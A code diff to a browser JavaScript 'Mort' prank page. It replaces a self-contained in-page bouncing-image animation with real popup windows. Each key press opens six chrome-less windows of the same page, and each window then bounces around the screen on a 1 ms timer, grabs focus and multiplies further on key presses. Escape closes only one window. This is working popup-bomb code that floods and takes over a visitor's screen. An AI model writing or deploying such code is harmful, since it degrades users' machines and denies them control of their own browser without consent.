@@ -1,14 +1,10 @@
-const playfield = document.getElementById("playfield");
 const voice = document.getElementById("mortVoice");
 
-const WINDOW_SIZE = 400;
-const MIN_SPEED = 3;
-const MAX_SPEED = 7;
-const mortWindows = [];
-
-function randomBetween(min, max) {
-  return Math.random() * (max - min) + min;
-}
+let xOff = 5;
+let yOff = 5;
+let xPos = 400;
+let yPos = 100;
+let flagRun = 1;
 
 function playVoice() {
   if (!voice) return;
@@ -16,93 +12,88 @@ function playVoice() {
   voice.play().catch(() => {});
 }
 
-function createMortWindow() {
-  const element = document.createElement("div");
-  element.className = "mort-window";
+function openWindow(url) {
+  return window.open(
+    url,
+    "_blank",
+    "menubar=no,status=no,toolbar=no,resizable=no,width=400,height=400,titlebar=no"
+  );
+}
 
-  const image = document.createElement("img");
-  image.src = "assets/mort.jpg";
-  image.alt = "";
-  image.className = "mort";
+function procreate() {
+  for (let i = 0; i < 6; i++) {
+    openWindow(`${window.location.pathname}?mort=1${window.location.hash}`);
+  }
+}
 
-  element.appendChild(image);
-  playfield.appendChild(element);
+function newXlt() {
+  xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+  window.focus();
+}
 
-  const maxX = Math.max(0, playfield.clientWidth - WINDOW_SIZE);
-  const maxY = Math.max(0, playfield.clientHeight - WINDOW_SIZE);
-  const angle = randomBetween(0, Math.PI * 2);
-  const speed = randomBetween(MIN_SPEED, MAX_SPEED);
+function newXrt() {
+  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
 
-  const instance = {
-    element,
-    x: randomBetween(0, maxX),
-    y: randomBetween(0, maxY),
-    vx: Math.cos(angle) * speed,
-    vy: Math.sin(angle) * speed
-  };
+function newYup() {
+  yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+}
 
-  mortWindows.push(instance);
+function newYdn() {
+  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+
+function fOff() {
+  flagRun = 0;
+}
+
+function playBall() {
+  xPos += xOff;
+  yPos += yOff;
+
+  if (xPos > screen.availWidth - 400) {
+    newXlt();
+  }
+
+  if (xPos < screen.availLeft) {
+    newXrt();
+  }
+
+  if (yPos > screen.availHeight - 400) {
+    newYup();
+  }
+
+  if (yPos < screen.availTop) {
+    newYdn();
+  }
+
+  if (flagRun === 1) {
+    try {
+      window.moveTo(Math.round(xPos), Math.round(yPos));
+    } catch (_) {}
+    setTimeout(playBall, 1);
+  }
 }
 
 function handleKeyDown(event) {
   if (event.key === "Escape") {
-    document.body.innerHTML = "";
-    document.body.style.background = "white";
+    fOff();
+    try {
+      window.close();
+    } catch (_) {}
     return;
   }
 
   playVoice();
-  createMortWindow();
-}
-
-function animate(now) {
-  const dt = Math.min((now - animate.lastTime) / 16.67, 2);
-  animate.lastTime = now;
-
-  const width = playfield.clientWidth;
-  const height = playfield.clientHeight;
-
-  for (const item of mortWindows) {
-    item.x += item.vx * dt;
-    item.y += item.vy * dt;
-
-    const maxX = Math.max(0, width - WINDOW_SIZE);
-    const maxY = Math.max(0, height - WINDOW_SIZE);
-
-    if (item.x <= 0) {
-      item.x = 0;
-      item.vx = Math.abs(item.vx);
-    } else if (item.x >= maxX) {
-      item.x = maxX;
-      item.vx = -Math.abs(item.vx);
-    }
-
-    if (item.y <= 0) {
-      item.y = 0;
-      item.vy = Math.abs(item.vy);
-    } else if (item.y >= maxY) {
-      item.y = maxY;
-      item.vy = -Math.abs(item.vy);
-    }
-
-    item.element.style.transform =
-      `translate3d(${item.x}px, ${item.y}px, 0)`;
-  }
-
-  requestAnimationFrame(animate);
+  procreate();
 }
 
 window.addEventListener("keydown", handleKeyDown);
-window.addEventListener("resize", () => {
-  const width = playfield.clientWidth;
-  const height = playfield.clientHeight;
 
-  for (const item of mortWindows) {
-    item.x = Math.min(item.x, Math.max(0, width - WINDOW_SIZE));
-    item.y = Math.min(item.y, Math.max(0, height - WINDOW_SIZE));
-  }
-});
-
-createMortWindow();
-animate.lastTime = performance.now();
-requestAnimationFrame(animate);
+if (window.opener) {
+  xPos = window.screenX;
+  yPos = window.screenY;
+  xOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 4);
+  yOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 4);
+  playBall();
+}
